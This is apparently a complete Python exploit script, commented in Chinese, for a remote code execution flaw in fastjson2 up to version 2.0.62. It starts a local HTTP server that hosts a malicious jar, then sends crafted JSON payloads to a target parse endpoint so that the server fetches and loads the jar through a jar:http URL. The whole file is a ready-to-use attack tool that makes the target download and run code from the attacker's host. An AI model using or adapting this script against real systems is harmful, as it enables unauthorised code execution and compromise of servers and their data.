#!/usr/bin/env python3
"""fastjson2 ≤2.0.62 RCE · FNV 哈希碰撞 + jar:http 远程加载

流程:
  1. 将恶意 jar 复制一份改名为 x
  2. 本地 HTTP 提供 x（目标通过 jar:http://<IP>:<PORT>/x 下载）
  3. 从 payload 文件读取要发送的 JSON（可能有多行，每行一个请求），逐个发送

用法:
  # 一阶段 jar:http（JDK8 一次性 RCE）
  python exp_2062.py \
      --jar poc/artifacts/2062/http-x \
      --payload poc/artifacts/2062/http-payload.txt \
      --url "http://192.168.50.2:4125/parse/2062?isParseObject=false"

  # 二阶段 fd 爆破（object/holder shape 时 payload 多行，逐行发送）
  python exp_2062.py \
      --jar poc/artifacts/2062/fd-x \
      --payload poc/artifacts/2062/fd-payload.txt \
      --url "http://192.168.50.2:4125/parse/2062?isParseObject=false"

注意: --port 必须与生成 payload 时碰撞前缀里的端口一致（默认 19090）。
"""
import argparse
import http.server
import os
import shutil
import sys
import threading
import traceback

import requests

# Windows 控制台默认 GBK，Unicode 碰撞字符打印会失败，强制 UTF-8
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")


def parse_args():
    ap = argparse.ArgumentParser(description="fastjson2 2.0.62 RCE exploit")
    ap.add_argument("--jar", default="artifacts/2062/fd-x", help="恶意 jar 路径（如 poc/artifacts/2062/http-x 或 fd-x）")
    ap.add_argument("--payload", default="artifacts/2062/fd-payload.txt", help="payload 文件（每行一个 JSON payload）")
    ap.add_argument("--url", default="http://192.168.50.2:4125/parse/2062?isParseObject=true",
                    help="目标解析端点")
    ap.add_argument("--host", default="0.0.0.0", help="HTTP 服务绑定地址（目标访问的IP须与 payload 中 jar:http 的IP一致）")
    ap.add_argument("--port", type=int, default=18083,
                    help="HTTP 服务端口（须与 payload 中 jar:http 的端口一致）")
    ap.add_argument("--jar-name", default="x", help="HTTP 提供的 jar 文件名（默认 x）")
    ap.add_argument("--timeout", type=float, default=10, help="单请求超时（秒）")
    return ap.parse_args()


def main():
    args = parse_args()

    jar_abs = os.path.abspath(args.jar)
    if not os.path.exists(jar_abs):
        sys.exit(f"[!] jar not found: {jar_abs}")
    workdir = os.path.dirname(jar_abs)
    jar_copy = os.path.join(workdir, args.jar_name)
    shutil.copyfile(jar_abs, jar_copy)
    print(f"[+] jar {jar_abs} -> {jar_copy} ({os.path.getsize(jar_copy)} bytes)")

    # 起本地 HTTP 提供 x
    old_cwd = os.getcwd()
    os.chdir(workdir)
    httpd = http.server.HTTPServer((args.host, args.port), http.server.SimpleHTTPRequestHandler)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    os.chdir(old_cwd)
    print(f"[*] serving {args.jar_name} on {args.host}:{args.port} (dir: {workdir})")

    # 读取 payload 文件（可能多行，每行一个 JSON）
    with open(args.payload, "r", encoding="utf-8") as f:
        payloads = [line.strip() for line in f if line.strip()]
    if not payloads:
        sys.exit(f"[!] payload file empty: {args.payload}")
    print(f"[*] {len(payloads)} payload(s) loaded from {args.payload}")

    hit = False
    for i, payload in enumerate(payloads, 1):
        try:
            rsp = requests.post(
                args.url,
                data=payload.encode("utf-8"),
                headers={"Content-Type": "application/json"},
                timeout=args.timeout,
                proxies={},  # 禁用代理，直连目标
            )
            text = rsp.text.replace("\n", " ")[:120]
            print(f"[{i}/{len(payloads)}] HTTP {rsp.status_code}: {text}")
            if rsp.status_code == 200:
                hit = True
        except Exception as e:
            traceback.print_exc()
            print(f"[{i}/{len(payloads)}] ERR: {type(e).__name__}: {e}")

    httpd.shutdown()
    print("[*] done" + ("  (200 received, class likely loaded)" if hit else ""))


if __name__ == "__main__":
    main()
